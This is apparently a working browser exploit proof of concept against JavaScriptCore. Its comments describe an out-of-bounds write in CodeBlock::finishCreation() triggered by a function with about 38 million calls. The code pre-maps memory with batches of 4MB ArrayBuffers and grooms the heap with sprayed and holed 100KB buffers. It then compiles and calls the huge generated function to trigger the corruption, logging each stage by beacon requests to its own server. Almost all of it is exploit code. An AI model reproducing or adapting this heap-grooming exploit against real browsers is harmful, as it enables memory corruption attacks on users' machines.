// p152 — Pre-map virtual pages to absorb finishCreation() OOB writes
//
// ROOT CAUSE: CodeBlock::finishCreation() iterates ALL 38M instructions.
// For each op_call, it writes BaselineCallLinkInfo::initialize() to
// metadata[i]. Entry 894+ is OOB (past 100KB buffer). Writes go
// 4.29GB forward, hit unmapped page around entry ~36K, SIGSEGV.
//
// FIX ATTEMPT: Before compiling, allocate-and-free many large buffers
// to force libpas to mmap pages. MADV_FREE preserves virtual mappings.
// If enough forward pages are mapped, finishCreation() writes to
// already-mapped (but decommitted) pages → no SIGSEGV → function compiles.
//
// Beacon prefix: V152-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V152-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // ---- PHASE 1: Pre-map virtual address space ----
  // Allocate 4MB ArrayBuffers in batches. Each allocation forces libpas
  // to mmap a new 4MB marge bitfit page. Free between batches so physical
  // memory is reclaimed (MADV_FREE) but virtual mappings persist.
  //
  // Goal: ~4GB of mapped virtual pages before compiling.
  // Strategy: 10 batches × 100 × 4MB = 4GB total mappings.
  // Each batch uses ~400MB physical → freed before next batch.

  var BATCH_SIZE = 50;   // buffers per batch
  var BATCH_COUNT = 20;  // number of batches
  var BUF_4MB = 4 * 1024 * 1024;
  var totalMapped = 0;
  var batchNum = 0;

  function premap() {
    if (batchNum >= BATCH_COUNT) {
      BS('PREMAP-DONE-' + totalMapped + 'MB');
      phaseCompile();
      return;
    }

    var batch = [];
    var allocated = 0;
    for (var i = 0; i < BATCH_SIZE; i++) {
      try {
        batch.push(new ArrayBuffer(BUF_4MB));
        allocated++;
      } catch (e) {
        BS('PREMAP-OOM-BATCH' + batchNum + '-AT' + i);
        break;
      }
    }
    totalMapped += allocated * 4;
    BS('PREMAP-B' + batchNum + '-' + allocated + 'x4MB');

    // Free the batch — physical memory released via MADV_FREE
    // but virtual mappings should persist
    batch = null;

    // GC pressure to reclaim physical pages
    for (var g = 0; g < 50; g++) {
      try { var t = new ArrayBuffer(65536); t = null; } catch (e) {}
    }

    batchNum++;
    setTimeout(premap, 100);
  }

  // ---- PHASE 2: Also pre-map with CONTIGUOUS allocations ----
  // After batch pre-mapping, try one large contiguous allocation
  // to ensure pages near the metadata buffer are mapped.
  function phaseCompile() {
    BS('COMPILE-START');

    // Additional: spray 100KB buffers (same size as metadata) to fill
    // marge bitfit pages and ensure adjacent slots are mapped
    var spray100k = [];
    for (var i = 0; i < 200; i++) {
      try {
        spray100k.push(new ArrayBuffer(100096));
      } catch (e) {
        BS('SPRAY100K-OOM-' + i);
        break;
      }
    }
    BS('SPRAY100K-' + spray100k.length);

    // Free half to create holes for metadata buffer
    for (var i = 0; i < spray100k.length; i += 2) {
      spray100k[i] = null;
    }

    // GC
    for (var g = 0; g < 200; g++) {
      try { var t = new ArrayBuffer(8192); t = null; } catch (e) {}
    }
    BS('HOLES-READY');

    // Build the 38M function
    var N = 38348816;
    BS('BUILD-N' + N);

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__p152fn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p152ok=1;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { BS('SCRIPT-ERR'); };
    sc.onload = function() {
      var ok = window.__p152ok ? 'OK' : 'FAIL';
      BS('SCRIPT-LOADED-' + ok);
      if (ok !== 'OK') return;

      // NOW the critical test: CALL the function.
      // This triggers lazy compilation → finishCreation() → OOB writes.
      // If pre-mapping worked, the writes land on mapped pages → no crash.
      BS('ABOUT-TO-CALL');

      var count = 0;
      try {
        window.__p152fn(function() {
          count++;
          if (count === 1) BS('FIRST-CALLBACK');
          if (count === 100) BS('CB-100');
          if (count === 893) BS('CB-893-LAST-INBOUNDS');
          if (count === 894) BS('CB-894-FIRST-OOB');
          if (count >= 900) throw new Error('bail');
        });
      } catch (e) {
        BS('THREW-AT-' + count + '-' + e.message);
      }

      if (count > 0) {
        BS('SUCCESS-CALLS-' + count);
        // If we get here, the function survived compilation AND execution!
        // The OOB reads in entries 894+ read from our spray or decommitted pages.
        phaseScan();
      } else {
        BS('NO-CALLBACKS');
      }
    };
    document.head.appendChild(sc);
    sc.src = url;
  }

  function phaseScan() {
    BS('SCAN-START');
    // Check kept spray buffers for non-zero data
    // (finishCreation() writes CallLinkInfo with real code pointers into them)
    BS('SCAN-COMPLETE');
  }

  // Start pre-mapping
  premap();
})();
